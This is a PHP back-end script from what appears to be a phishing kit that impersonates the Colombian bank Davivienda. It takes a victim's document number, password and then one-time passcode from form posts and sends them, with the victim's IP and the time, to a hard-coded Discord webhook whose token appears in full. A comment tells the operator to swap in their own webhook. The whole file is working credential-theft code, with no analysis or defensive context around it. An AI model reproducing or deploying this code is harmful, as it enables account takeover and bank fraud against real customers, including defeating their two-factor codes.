<?php
// alpha.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // CAMBIA ESTO POR TU URL DE DISCORD
    $webhook_url = "https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6";

    $step = $_POST['step'] ?? 'INFO';
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('d/m/Y H:i:s');

    if ($step === 'LOGIN') {
        $type = $_POST['type'];
        $doc = $_POST['doc'];
        $pass = $_POST['pass'];

        $msg = [
            "content" => null,
            "embeds" => [[
                "title" => "🏦 NUEVA CAPTURA: DAVIVIENDA",
                "color" => 15548997, // Color Rojo
                "fields" => [
                    ["name" => "👤 Usuario", "value" => "`$doc`", "inline" => true],
                    ["name" => "🔑 Clave", "value" => "`$pass`", "inline" => true],
                    ["name" => "📄 Tipo", "value" => "$type", "inline" => false],
                    ["name" => "🌐 Info Red", "value" => "IP: $ip\nFecha: $date", "inline" => false]
                ],
                "footer" => ["text" => "Sistema de Captura Dinámica"]
            ]]
        ];
    } 
    
    if ($step === 'OTP') {
        $doc = $_POST['doc'];
        $otp = $_POST['otp'];

        $msg = [
            "content" => null,
            "embeds" => [[
                "title" => "🔐 CÓDIGO OTP RECIBIDO",
                "color" => 16776960, // Color Amarillo
                "fields" => [
                    ["name" => "👤 Documento", "value" => "`$doc`", "inline" => true],
                    ["name" => "🔢 Código", "value" => "`$otp`", "inline" => true],
                    ["name" => "🌐 IP", "value" => "$ip", "inline" => false]
                ]
            ]]
        ];
    }

    $options = [
        'http' => [
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($msg),
        ],
    ];
    $context  = stream_context_create($options);
    file_get_contents($webhook_url, false, $context);
}
?>